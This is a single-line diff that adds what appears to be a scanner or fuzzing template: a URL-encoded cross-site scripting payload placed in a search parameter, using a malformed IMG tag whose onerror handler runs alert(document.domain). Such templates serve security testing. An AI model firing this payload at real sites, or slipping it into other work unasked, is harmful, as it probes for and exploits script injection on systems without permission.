@@ -1,0 +1,1 @@
+/?s={{str}}%3CIMG%20%22%22%22%3E%3CIMG%20SRC=/%20onerror=%22alert(document.domain)%22%3E%3C/img%3E/{{random}}/
